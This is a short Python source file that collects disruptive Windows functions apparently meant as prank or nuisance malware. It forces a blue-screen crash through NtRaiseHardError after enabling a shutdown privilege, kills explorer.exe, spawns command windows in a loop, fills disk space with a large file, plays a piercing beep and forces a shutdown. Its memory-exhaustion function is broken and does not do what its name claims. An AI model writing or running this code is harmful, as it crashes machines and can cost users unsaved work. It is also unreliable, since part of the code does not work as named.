from itertools import permutations
from os import system
from winsound import Beep
from ctypes import POINTER, windll, c_uint, byref, c_int, c_ulong


def ram_overload(num=1):
    num *= 50000000
    a = permutations([i for i in range(num)])


def cmd_spam(count):
    for _ in range(count):
        system('start cmd')

def close_explorer():
    system('taskkill /F /IM explorer.exe')


def bad_sound(duration_seconds):
    Beep(10000, duration_seconds * 1000)


def create_file(location, size_in_mg):
    size = size_in_mg * 1024 ** 2
    f = open(location, 'wb')
    f.write(bytes(size))
    f.close()


def BSOD():
    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19),
        c_uint(1),
        c_uint(0),
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B),
        c_ulong(0),
        nullptr,
        nullptr,
        c_uint(6),
        byref(c_uint())
    )


def shutdown():
    system('shutdown /s /t 15 /f /d 5:15')